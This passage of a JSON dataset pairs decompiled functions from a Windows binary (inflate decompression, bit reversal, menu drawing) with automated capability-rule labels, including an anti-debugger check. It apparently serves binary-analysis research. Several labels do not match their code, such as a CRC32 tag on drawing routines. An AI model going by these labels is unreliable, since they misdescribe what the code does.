= arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                            }\n                                            piVar2[0xf] = piVar2[0xf] + ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                            uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                            uVar13 = uVar13 - piVar2[0x11];\n                                        }\n                                        *piVar2 = 0xc;\ncode_r0x004494d9:\n                                        for (; uVar12 = *(piVar2[0x13] +\n                                                         ((1 << (piVar2[0x15] & 0x1f)) - 1U & uStack44) * 4), \n                                            uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                            if (puVar14 == NULL) goto code_r0x00449826;\n                                            uVar1 = *arg_ch;\n                                            arg_ch = arg_ch + 1;\n                                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                            puVar14 = puVar14 + -1;\n                                        }\n                                        uStack28 = uVar12;\n                                        if ((uVar12 & 0xf0) == 0) {\n                                            while( true ) {\n                                                cStack24 = uVar12;\n                                                uStack23 = uVar12 >> 8;\n                                                uStack28 = *(piVar2[0x13] +\n                                                            ((((1 << (uStack23 + cStack24 & 0x1f)) - 1U & uStack44) >>\n                                                             (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                                if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                                if (puVar14 == NULL) goto code_r0x00449826;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                                uVar13 = uVar13 + 8;\n                                            }\n                                            uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                            uVar13 = uVar13 - uStack23;\n                                        }\n                                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                        uVar13 = uVar13 - uStack28._1_1_;\n                                        if ((uStack28 & 0x40) == 0) {\n                                            piVar2[0x10] = uStack28 >> 0x10;\n                                            piVar2[0x11] = uStack28 & 0xf;\n                                            *piVar2 = 0xd;\ncode_r0x004495dc:\n                                            if (piVar2[0x11] != 0) {\n                                                for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                    if (puVar14 == NULL) goto code_r0x00449826;\n                                                    uVar1 = *arg_ch;\n                                                    arg_ch = arg_ch + 1;\n                                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                    puVar14 = puVar14 + -1;\n                                                }\n                                                piVar2[0x10] = piVar2[0x10] +\n                                                               ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                                uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                                uVar13 = uVar13 - piVar2[0x11];\n                                            }\n                                            if (puStack36 + (piVar2[10] - puStack48) < piVar2[0x10]) {\n                                                in_EAX[6] = \"invalid distance too far back\";\n                                                *piVar2 = 0x12;\n                                            }\n                                            else {\n                                                *piVar2 = 0xe;\ncode_r0x0044964a:\n                                                if (puStack48 == NULL) goto code_r0x00449826;\n                                                if (puStack36 - puStack48 < piVar2[0x10]) {\n                                                    puStack32 = piVar2[0x10] - (puStack36 - puStack48);\n                                                    puVar7 = piVar2[0xb];\n                                                    if (puVar7 < puStack32) {\n                                                        puStack32 = puStack32 + -puVar7;\n                                                        puVar7 = (piVar2[9] - puStack32) + piVar2[0xc];\n                                                    }\n                                                    else {\n                                                        puVar7 = puVar7 + (piVar2[0xc] - puStack32);\n                                                    }\n                                                    if (piVar2[0xf] < puStack32) {\n                                                        puStack32 = piVar2[0xf];\n                                                    }\n                                                }\n                                                else {\n                                                    puStack32 = piVar2[0xf];\n                                                    puVar7 = puVar9 + -piVar2[0x10];\n                                                }\n                                                if (puStack48 < puStack32) {\n                                                    puStack32 = puStack48;\n                                                }\n                                                puStack48 = puStack48 + -puStack32;\n                                                piVar2[0xf] = piVar2[0xf] - puStack32;\n                                                do {\n                                                    *puVar9 = *puVar7;\n                                                    puVar7 = puVar7 + 1;\n                                                    puVar9 = puVar9 + 1;\n                                                    puStack32 = puStack32 + -1;\n                                                } while (puStack32 != NULL);\n                                                if (piVar2[0xf] == 0) {\n                                                    *piVar2 = 10;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            in_EAX[6] = \"invalid distance code\";\n                                            *piVar2 = 0x12;\n                                        }\n                                    }\n                                    else {\n                                        in_EAX[6] = \"invalid literal/length code\";\n                                        *piVar2 = 0x12;\n                                    }\n                                }\n                                else {\n                                    *piVar2 = 3;\n                                }\n                            }\n                            else {\n                                in_EAX[3] = puVar9;\n                                in_EAX[4] = puStack48;\n                                *in_EAX = arg_ch;\n                                in_EAX[1] = puVar14;\n                                piVar2[0xd] = uStack44;\n                                piVar2[0xe] = uVar13;\n                                fcn.004482cc();\n                                puVar9 = in_EAX[3];\n                                puStack48 = in_EAX[4];\n                                arg_ch = *in_EAX;\n                                puVar14 = in_EAX[1];\n                                uStack44 = piVar2[0xd];\n                                uVar13 = piVar2[0xe];\n                            }\n                        }\n                        else {\n                            in_EAX[6] = \"invalid distances set\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"invalid literal/lengths set\";\n                        *piVar2 = 0x12;\n                    }\n                }\n            }\n            else {\n                in_EAX[6] = \"invalid code lengths set\";\n                *piVar2 = 0x12;\n            }\n            break;\n        case 9:\n            goto code_r0x0044922d;\n        case 10:\n            goto code_r0x004492f0;\n        case 0xb:\n            goto code_r0x00449490;\n        case 0xc:\n            goto code_r0x004494d9;\n        case 0xd:\n            goto code_r0x004495dc;\n        case 0xe:\n            goto code_r0x0044964a;\n        case 0xf:\n            if (puStack48 == NULL) goto code_r0x00449826;\n            *puVar9 = *(piVar2 + 0xf);\n            puVar9 = puVar9 + 1;\n            puStack48 = puStack48 + -1;\n            *piVar2 = 10;\n            break;\n        case 0x10:\n            if (piVar2[2] == 0) {\ncode_r0x004497f3:\n                *piVar2 = 0x11;\n                goto code_r0x004497f9;\n            }\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00449826;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            iVar8 = puStack36 - puStack48;\n            in_EAX[5] = in_EAX[5] + iVar8;\n            piVar2[7] = piVar2[7] + iVar8;\n            if (iVar8 != 0) {\n                puVar7 = fcn.0044686c();\n                piVar2[6] = puVar7;\n                in_EAX[0xc] = puVar7;\n            }\n            puStack36 = puStack48;\n            if ((uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000 ==\n                piVar2[6]) {\n                uVar13 = 0;\n                uStack44 = 0;\n                goto code_r0x004497f3;\n            }\n            in_EAX[6] = \"incorrect data check\";\n            *piVar2 = 0x12;\n            break;\n        case 0x11:\ncode_r0x004497f9:\n            iStack20 = 1;\ncode_r0x00449826:\n            in_EAX[3] = puVar9;\n            in_EAX[4] = puStack48;\n            *in_EAX = arg_ch;\n            in_EAX[1] = puVar14;\n            piVar2[0xd] = uStack44;\n            piVar2[0xe] = uVar13;\n            if (((piVar2[9] != 0) || ((*piVar2 < 0x10 && (in_EAX[4] != puStack36)))) &&\n               (iVar8 = fcn.0044897c(),  iVar8 != 0)) {\n                *piVar2 = 0x13;\n                return -4;\n            }\n            iVar8 = puVar3 - in_EAX[1];\n            iVar5 = puStack36 - in_EAX[4];\n            in_EAX[2] = in_EAX[2] + iVar8;\n            in_EAX[5] = in_EAX[5] + iVar5;\n            piVar2[7] = piVar2[7] + iVar5;\n            if ((piVar2[2] != 0) && (iVar5 != 0)) {\n                puVar9 = fcn.0044686c();\n                piVar2[6] = puVar9;\n                in_EAX[0xc] = puVar9;\n            }\n            if (piVar2[1] == 0) {\n                iVar11 = 0;\n            }\n            else {\n                iVar11 = 0x40;\n            }\n            if (*piVar2 == 3) {\n                iVar10 = 0x80;\n            }\n            else {\n                iVar10 = 0;\n            }\n            in_EAX[0xb] = iVar11 + piVar2[0xe] + iVar10;\n            if (((iVar8 != 0) || (iVar5 != 0)) && (param_2 != 4)) {\n                return iStack20;\n            }\n            if (iStack20 != 0) {\n                return iStack20;\n            }\n            return -5;\n        case 0x12:\n            iStack20 = -3;\n            goto code_r0x00449826;\n        case 0x13:\n            return -4;\n        default:\n            return -2;\n        }\n    } while( true );\n}\n",
        "token_count": 7923
    },
    "0044bdcc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044bdcc(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = in_EAX & 1;\n        in_EAX = in_EAX >> 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 160
    },
    "004538dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.004538dc(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 219
    },
    "00454b64": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454b64(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4554a6;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00454c20;\n        fcn.00452050();\n        cVar3 = fcn.00452158();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00454c20;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00428404();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00452050();\n        cVar3 = fcn.00452158();\n        if (cVar3 == '\\0') {\n            fcn.00428404();\n        }\n        else {\n            fcn.00428404();\n        }\n        fcn.00427b48();\n        puVar2 = puStack24;\n    }\ncode_r0x00454c20:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.004287a8();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047cc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405894();\n    if (bVar9) {\n        fcn.004287a8();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.0046cdd8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.004283fc();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004283fc();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042f10c();\n                    fcn.004283d8();\n                    fcn.004287a8();\n                }\n                else {\n                    fcn.00428404();\n                    fcn.004287a8();\n                }\n                fcn.00428404();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00428870();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.0046cdd8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042cbe0();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042ddc8();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.00427b48();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.004286fc(iVar5);\n                    fcn.00427b48();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404640(0x455105);\n                    return;\n                }\n                fcn.0046d0c8(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.00428b60();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00428404();\n        }\n        fcn.004287a8();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00428b60();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00428b60();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4a475c) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00427ed4();\n    }\n    fcn.0045490c(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.0045490c(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00453968();\n        fcn.0045490c(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.0040546c(0x4554ad);\n    return;\n}\n",
        "token_count": 4181
    },
    "004554c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004554c4(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x455e26;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00455580;\n        fcn.00452050();\n        cVar3 = fcn.00452158();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00455580;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00428404();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00452050();\n        cVar3 = fcn.00452158();\n        if (cVar3 == '\\0') {\n            fcn.00428404();\n        }\n        else {\n            fcn.00428404();\n        }\n        fcn.00427b48();\n        puVar2 = puStack24;\n    }\ncode_r0x00455580:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || ((*(lprc + -0x21) != '\\0' && (*(*(lprc + -0x38) + 0x38) == '\\0')))) {\n        fcn.004287a8();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047cc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -8) = *(lprc + -0x18) + -1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405894();\n    if (bVar9) {\n        fcn.004287a8();\n        *(lprc + -0x10) = *(lprc + -8) + 2;\n        *(lprc + -8) = 0;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.0046cdd8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -0x10) = *(lprc + -8);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x10) = *(lprc + -8) + -0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -0x10) = *(lprc + -0x10) + -1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.004283fc();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004283fc();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042f10c();\n                    fcn.004283d8();\n                    fcn.004287a8();\n                }\n                else {\n                    fcn.00428404();\n                    fcn.004287a8();\n                }\n                fcn.00428404();\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -8) = (*(lprc + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -0x10) = *(lprc + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00428870();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.0046cdd8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042cbe0();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042ddc8();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.00427b48();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.004286fc(iVar5);\n                    fcn.00427b48();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404640(0x455a6d);\n                    return;\n                }\n                fcn.0046d0c8(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + 